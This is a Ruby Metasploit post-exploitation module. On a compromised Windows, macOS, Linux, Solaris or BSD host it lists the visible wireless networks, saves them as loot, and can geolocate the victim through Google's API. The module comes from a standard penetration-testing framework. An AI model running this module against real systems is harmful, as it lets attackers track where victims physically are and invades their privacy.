##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/google/geolocation'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multiplatform WLAN Enumeration and Geolocation',
        'Description'   => %q{ Enumerate wireless networks visible to the target device.
        Optionally geolocate the target by gathering local wireless networks and
        performing a lookup against Google APIs.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
        'Platform'      => %w{ osx win linux bsd solaris },
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
      ))

      register_options(
        [
        OptBool.new('GEOLOCATE', [ false, 'Use Google APIs to geolocate Linux, Windows, and OS X targets.', false]),
        OptString.new('APIKEY', [ false, 'Key for Google APIs if error is received without one.', '']),
        ])

  end

  def get_strength(quality)
    # Convert the signal quality to signal strength (dbm) to be sent to
    # Google.  Docs indicate this should subtract 100 instead of the 95 I
    # am using here, but in practice 95 seems to be closer.
    signal_str = quality.to_i / 2
    signal_str = (signal_str - 95).round
    return signal_str

  end

  def parse_wireless_win(listing)
    wlan_list = []
    raw_networks = listing.split("\r\n\r\n")

    raw_networks.each do |network|
      details = network.match(/^SSID [\d]+ : ([^\r\n]*).*?BSSID 1[\s]+: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal[\s]+: ([\d]{1,3})%/m)
      if !details.nil?
        strength = get_strength(details[3])
        wlan_list << [ details[2], details[1], strength ]
      end
    end

    return wlan_list
  end


  def parse_wireless_linux(listing)
    wlan_list = []
    raw_networks = listing.split("Cell ")

    raw_networks.each do |network|
      details = network.match(/^[\d]{1,4} - Address: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal level=([\d-]{1,3}).*?ESSID:"([^"]*)/m)
      if !details.nil?
        wlan_list << [ details[1], details[3], details[2] ]
      end
    end

    return wlan_list
  end

  def parse_wireless_osx(listing)
    wlan_list = []
    raw_networks = listing.split("\n")

    raw_networks.each do |network|
      network = network.strip
      details = network.match(/^(.*(?!\h\h:))[\s]*([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2})[\s]*([\d-]{1,3})/)
      if !details.nil?
        wlan_list << [ details[2], details[1], details[3] ]
      end
    end

    return wlan_list
  end

  def perform_geolocation(wlan_list)
    if wlan_list.blank?
      print_error('Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.')
      return
    elsif datastore['APIKEY'].empty?
      print_error("Google API key is required.")
      return
    end
    g = Rex::Google::Geolocation.new
    g.set_api_key(datastore['APIKEY'])
    wlan_list.each do |wlan|
      g.add_wlan(wlan[0], wlan[2]) # bssid, signalstrength
    end

    begin
      g.fetch!
    rescue RuntimeError => e
      print_error("Error: #{e}")
    else
      print_status(g.to_s)
      print_status("Google Maps URL:  #{g.google_maps_url}")
    end

  end


  # Run Method for when run command is issued
  def run
    case session.platform
    when 'windows'
      listing = cmd_exec('netsh wlan show networks mode=bssid')
      if listing.nil?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.windows.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        # The wireless output does not lend itself to displaying on screen for this platform.
        print_good("Wireless list saved to loot.")
        if datastore['GEOLOCATE']
          wlan_list = parse_wireless_win(listing)
          perform_geolocation(wlan_list)
          return
        end
      end

    when 'osx'
      listing = cmd_exec('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s')
      if listing.nil?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.osx.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        print_good("Target's wireless networks:\n\n#{listing}\n")
        if datastore['GEOLOCATE']
          wlan_list = parse_wireless_osx(listing)
          perform_geolocation(wlan_list)
          return
        end
      end

    when 'linux'
      listing = cmd_exec('iwlist scanning')
      if listing.nil?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.linux.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        # The wireless output does not lend itself to displaying on screen for this platform.
        print_good("Wireless list saved to loot.")
        if datastore['GEOLOCATE']
          wlan_list = parse_wireless_linux(listing)
          perform_geolocation(wlan_list)
          return
        end
      end

    when 'solaris'
      listing = cmd_exec('dladm scan-wifi')
      if listing.blank?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.solaris.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        print_good("Target's wireless networks:\n\n#{listing}\n")
        print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
        return
      end

    when 'bsd'
      interface = cmd_exec("dmesg | grep -i wlan | cut -d ':' -f1 | uniq")
      # Printing interface as this platform requires the interface to be specified
      # it might not be detected correctly.
      print_status("Found wireless interface: #{interface}")
      listing = cmd_exec("ifconfig #{interface} scan")
      if listing.blank?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.bsd.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        print_good("Target's wireless networks:\n\n#{listing}\n")
        print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
        return
      end

    else
      print_error("The target's platform, #{platform}, is not supported at this time.")
      return nil
    end

  rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
  rescue ::Exception => e
    print_status("The following Error was encountered: #{e.class} #{e}")
  end


end
